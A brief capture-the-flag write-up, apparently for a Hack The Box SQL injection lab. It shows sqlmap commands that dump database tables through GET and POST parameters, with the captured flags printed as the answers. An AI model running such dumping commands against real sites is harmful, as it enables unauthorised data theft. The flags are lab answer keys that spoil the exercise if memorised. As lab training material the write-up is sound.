## Challenge 1

What's the contents of table flag2? (Case #2) 

## Solution 1

On the page there are a number of cases.

I click on `Case1` and in there it is a button `click here` - this sends me to a page where the url is `http://94.237.54.116:53907/case1.php?id=1` which tells me that it is a `GET` request.

So I put the following sqlmap command:

```sh
sqlmap -u 'http://94.237.54.116:53907/case1.php?id=1' --dump
```

And I see the result:

```sh
Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
```

But, I'm interested on the flag2 so it should be case 2. There I can put a number and submit, but the url remains `http://94.237.54.116:53907/case2.php`, so it should be a POST request. I send this request to BURP and copy the request to a file.

Then I run the sqlmap command:
```sh
sqlmap -r case2.txt --batch --dump
```

and I got the result, which is `HTB{700_much_c0n6r475_0n_p057_r3qu357}`.